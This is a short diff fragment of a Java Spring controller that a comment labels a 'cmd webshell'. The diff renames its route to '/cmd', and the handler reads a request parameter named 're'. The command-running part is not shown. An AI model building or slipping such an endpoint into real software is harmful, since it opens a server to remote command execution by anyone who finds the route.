@@ -11,7 +11,7 @@ import java.io.PrintWriter;
 //cmd webshell
 @Controller
 public class ExecuteController {
-    @RequestMapping("/day1")
+    @RequestMapping("/cmd")
     public void echo(HttpServletRequest request, HttpServletResponse response){
         try {
             String arg0 = request.getParameter("re");
